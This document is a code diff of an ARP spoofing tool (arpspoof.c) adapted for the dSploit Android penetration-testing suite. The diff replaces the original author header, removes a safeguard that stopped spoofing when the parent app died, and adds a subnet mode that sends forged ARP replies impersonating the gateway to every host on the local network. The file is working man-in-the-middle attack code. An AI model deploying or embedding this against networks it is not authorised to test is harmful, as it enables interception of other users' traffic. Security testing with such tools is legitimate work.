@@ -1,16 +1,21 @@
 /*
- * arpspoof.c
+ * This file is part of the dSploit.
  *
- * Redirect packets from a target host (or from all hosts) intended for
- * another host on the LAN to ourselves.
- * 
- * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
+ * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
  *
- * Adapted and fixed by Simone Margaritelli <evilsocket@gmail.com>
+ * dSploit is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
  *
- * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
+ * dSploit is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
  */
-
 #include "config.h"
 
 #include <sys/types.h>
@@ -27,14 +32,11 @@
 #include <netinet/if_ether.h>
 
 #include <droid.h>
-#include "ensure_death.h"
 
 #include "arp.h"
 #include "version.h"
 
 #define BROADCAST_MAC_ADDR "\xff\xff\xff\xff\xff\xff"
-
-//extern char *ether_ntoa(struct ether_addr *);
 
 /*Added since Android's ndk couldn't find ether_ntoa*/
 char *ether_ntoa(struct ether_addr *addr)
@@ -49,8 +51,8 @@ char *ether_ntoa(struct ether_addr *addr)
 
 static libnet_t *l;
 static struct ether_addr spoof_mac, target_mac;
-static in_addr_t spoof_ip, target_ip;
-static char *intf;
+static in_addr_t gateway_ip, target_ip;
+static char *iface;
 
 static void
 usage(void)
@@ -94,8 +96,6 @@ static int arp_send( libnet_t *pnet, int arp_op, u_int8_t *sha, in_addr_t spa, u
 	retval = libnet_write( pnet );
 	if( retval == -1 )
 		printf( "libnet_write failed : %s\n", libnet_geterror( pnet ) );
-	else
-		printf( "spoof : op %d sent.\n", arp_op );
 
 	libnet_clear_packet( pnet );
 
@@ -131,7 +131,7 @@ arp_find(in_addr_t ip, struct ether_addr *mac)
 	int i = 0;
 
 	do {
-		if (arp_cache_lookup(ip, mac, intf) == 0)
+		if (arp_cache_lookup(ip, mac, iface) == 0)
 			return (1);
 #ifdef __linux__
 		/* XXX - force the kernel to arp. feh. */
@@ -152,11 +152,11 @@ cleanup(int sig)
 	printf( "Restoring arp table ...\n" );
 	int i;
 	
-	if (arp_find(spoof_ip, &spoof_mac)) {
+	if (arp_find(gateway_ip, &spoof_mac)) {
 		for (i = 0; i < 3; i++) {
 			/* XXX - on BSD, requires ETHERSPOOF kernel. */
 			arp_send(l, ARPOP_REPLY,
-				 (u_int8_t *)&spoof_mac, spoof_ip,
+				 (u_int8_t *)&spoof_mac, gateway_ip,
 				 (target_ip ? (u_int8_t *)&target_mac : NULL),
 				 target_ip);
 			sleep(1);
@@ -165,29 +165,30 @@ cleanup(int sig)
 	exit(0);
 }
 
-int
-main(int argc, char *argv[])
+int main(int argc, char *argv[])
 {
 	extern char *optarg;
-	extern int optind;
+	extern int   optind;
 	char pcap_ebuf[PCAP_ERRBUF_SIZE];
 	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
-	int c;
+	int  c;
 	
-	intf = NULL;
-	spoof_ip = target_ip = 0;
+	iface			 = NULL;
+	gateway_ip = target_ip = 0;
 	
-	while ((c = getopt(argc, argv, "i:t:h?V")) != -1) {
-		switch (c) {
-		case 'i':
-			intf = optarg;
-			break;
-		case 't':
-			if ((target_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
+	while( (c = getopt(argc, argv, "i:t:h?V")) != -1)
+	{
+		switch (c)
+		{
+			case 'i':
+				iface = optarg;
+				break;
+			case 't':
+				if ((target_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
+					usage();
+				break;
+			default:
 				usage();
-			break;
-		default:
-			usage();
 		}
 	}
 	argc -= optind;
@@ -196,15 +197,15 @@ main(int argc, char *argv[])
 	if (argc != 1)
 		usage();
 	
-	if ((spoof_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
+	if ((gateway_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
 		usage();
 	
-	if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL) {
+	if (iface == NULL && (iface = pcap_lookupdev(pcap_ebuf)) == NULL) {
 		printf( "%s\n", pcap_ebuf);
 		exit(1);
 	}
 
-	if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL) {
+	if ((l = libnet_init(LIBNET_LINK, iface, libnet_ebuf)) == NULL) {
 		printf( "%s\n", libnet_ebuf);
 		exit(1);
 	}
@@ -217,15 +218,76 @@ main(int argc, char *argv[])
 	signal( SIGHUP, cleanup );
 	signal( SIGINT, cleanup );
 	signal( SIGTERM, cleanup );
-
-	/*Makes sure that if the calling app dies we quit spoofing*/
-	// ensure_death();
 	
-	for (;;) {
-		arp_send( l, ARPOP_REPLY, NULL, spoof_ip, (target_ip ? (u_int8_t *)&target_mac : NULL), target_ip );
-		sleep(1);
+	// single ip spoofing
+	if( target_ip != 0 )
+	{
+		printf( "Single target mode.\n" );
+		for (;;) {
+			arp_send( l, ARPOP_REPLY, NULL, gateway_ip, (target_ip ? (u_int8_t *)&target_mac : NULL), target_ip );
+			sleep(1);
+		}
 	}
-	/* NOTREACHED */
-	
-	exit(0);
+	// whole network spoofing
+	else
+	{
+		printf( "Subnet mode.\n" );
+
+		int netmask = 0,
+				ifaddr  = 0,
+				nhosts  = 0,
+				i;
+		pcap_if_t *ifaces = NULL,
+						  *pcap_iface;
+		pcap_addr_t *pcap_address;
+
+		if( pcap_findalldevs( &ifaces, pcap_ebuf ) != 0 )
+		{
+			printf( "%s\n", pcap_ebuf);
+			exit(1);
+		}
+
+		for( pcap_iface = ifaces; pcap_iface != NULL && netmask == 0; pcap_iface = pcap_iface->next )
+		{
+			if( strcmp( pcap_iface->name, iface ) == 0 )
+			{
+				for( pcap_address = pcap_iface->addresses; pcap_address != NULL; pcap_address = pcap_address->next )
+				{
+					if( pcap_address->addr->sa_family == AF_INET )
+					{
+						ifaddr  = *( unsigned int *)&((struct sockaddr_in*)pcap_address->addr)->sin_addr;
+						netmask = *( unsigned int *)&((struct sockaddr_in*)pcap_address->netmask)->sin_addr;
+
+						break;
+					}
+				}
+			}
+		}
+
+		if( netmask == 0 || ifaddr == 0 )
+			exit( 1 );
+
+		nhosts = ntohl(~netmask);
+
+		printf( "netmask = %s\n", inet_ntoa( *( struct in_addr *)&netmask ) );
+		printf( "ifaddr  = %s\n", inet_ntoa( *( struct in_addr *)&ifaddr ) );
+		printf( "gateway = %s\n", inet_ntoa( *( struct in_addr *)&gateway_ip ) );
+		printf( "hosts   = %d\n", nhosts );
+
+		for(;;)
+		{
+			for( i = 1; i <= nhosts; i++ )
+			{
+				int current = ( ifaddr & netmask ) | htonl(i);
+
+				if( current != ifaddr && current != gateway_ip )
+					arp_send( l, ARPOP_REPLY, NULL, gateway_ip, NULL, current );
+			}
+
+			sleep(1);
+		}
+
+	}
+
+	return 0;
 }
